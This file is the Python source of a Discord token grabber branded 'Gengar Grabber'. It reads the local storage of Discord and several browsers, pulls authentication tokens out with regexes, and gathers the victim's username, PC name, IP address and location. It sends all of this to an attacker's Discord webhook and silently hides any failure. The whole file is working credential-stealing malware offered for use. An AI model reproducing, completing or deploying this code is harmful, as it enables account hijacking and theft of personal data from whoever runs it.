import os
import re
import json
import requests
import urllib.request
import datetime

ping_me = True
webhook_url = ''
Victim = os.getlogin()


def find_tokens(path):
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    if token.startswith("N") or token.startswith("O") or token.startswith("mfa"):
                        tokens.append(token)
    return tokens

def Grabber():
    LOCAL = os.getenv('LOCALAPPDATA')
    ROAMING = os.getenv('APPDATA')
    paths = {
        'Discord': ROAMING + '\\discord\\Local Storage\\leveldb\\',
        'Google_Chrome' : ROAMING + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX' : ROAMING + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        'Microsoft Edge' : LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
        'Brave' : LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',        
    }

    def userinfo():
        url = "http://ipinfo.io/json"
        responce = urllib.request.urlopen(url)
        data = json.load(responce)
        ip = data['ip']
        org = data['org']
        city = data['city']
        region = data['region']
        country = data['country']
        loc = data['loc']
        return ip,org,city,region,country,loc

    if ping_me:
        message = "||@everyone|| \n"
    message += "```fix\n"

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f'\n{platform}\n'
        tokens = find_tokens(path)
        if len(tokens) > 0:
            message += 'Tokens: '
            for token in tokens:
                message += f'{token}' + '\n'
        else:
            message += '[!]ERROR: No tokens found.\n'
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    message += "```"
    payload = json.dumps({'content': message})
    try:
        req = urllib.request.Request(webhook_url, data=payload.encode(), headers=headers)
        urllib.request.urlopen(req)
        today = datetime.date.today()

        alert = {
            "avatar_url": "https://cdn.discordapp.com/attachments/915014426770419763/999936832764657694/unknown.png",
            "name": "grabber",
            "embeds": [{
                "author": {
                    "name": f"Gengar Grabber has been opened by **{Victim}**",
                    "icon_url": "https://cdn.discordapp.com/attachments/915014426770419763/999936832764657694/unknown.png",
                    "url": "https://github.com/xannbtw",
                },
            "description": "\n[Google Maps Location](https://www.google.com/maps/search/google+map++" + userinfo()[5] + ')' + '\n\n' +  f"**Username** : " + os.getenv('USER', os.getenv('USERNAME', 'user')) + '  **PC Name** : ' + os.getenv('COMPUTERNAME') + '  \n**IP** : ' + userinfo()[0] + ' \n**Country** : ' + userinfo()[4] + '  **City**: ' + userinfo()[2] + '  **Region** : ' + userinfo()[3],
            "color": 0x58D3F7,
            "thumbnail":{
                "url":"https://cdn.discordapp.com/attachments/862163169484472380/999096422198685757/a_9fa03182837bff68763b3a24b6639cb2.gif"
                },
            "footer": {
                "text": f" Grabber By 𝙭𝙖𝙣𝙣 𝙬𝙧𝙡𝙙#0101 | https://github.com/xannbtw"
            }
        }]
        }
        requests.post(webhook_url, json=alert)
    except:
        pass

if __name__ == '__main__':
    Grabber()
else:
    print("Error: Unknown")
